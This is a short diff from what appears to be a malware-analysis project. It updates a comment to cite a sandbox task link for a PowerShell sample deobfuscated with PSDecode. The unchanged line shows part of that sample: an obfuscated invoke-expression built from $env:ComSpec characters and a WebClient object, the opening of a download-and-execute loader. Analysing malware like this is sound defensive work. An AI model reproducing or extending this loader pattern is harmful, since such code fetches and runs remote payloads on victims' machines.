@@ -1,4 +1,4 @@
-// Powershell command fetched using app.any.run
+// Powershell command fetched using: https://app.any.run/tasks/7e2652e4-c307-423f-be09-6942f7542b45/
 // Deobfuscated using PSDecode
 
 . ( $env:coMSpeC[4,15,25]-jOin'') webClientLib = new-object System.Net.WebClient;
